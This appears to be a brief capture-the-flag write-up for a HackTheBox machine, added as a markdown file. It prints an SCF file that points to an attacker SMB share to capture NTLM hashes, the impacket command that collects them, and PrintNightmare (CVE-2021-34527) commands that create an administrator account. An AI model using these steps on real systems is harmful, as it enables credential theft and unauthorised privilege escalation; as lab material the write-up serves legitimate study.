@@ -1,0 +1,27 @@
+we saw a file uploading page so we uploaded a scf file
+
+```
+[shell]
+Command=2
+IconFile=\\10.10.16.2\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+
+
+then open smb for listening hashes 
+
+impacket-smbserver -debug -smb2support share /home/nored0x/Desktop/HTB/driver
+```
+
+we got hash and connectede over winrm
+
+winpeas showed console.txt and it says printer was added
+
+```
+we downloaded it https://github.com/JohnHammond/CVE-2021-34527
+Import-Module .\cve-2021-34527.ps1
+Invoke-Nightmare
+Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
+
+now we did winrm and became admin
+```
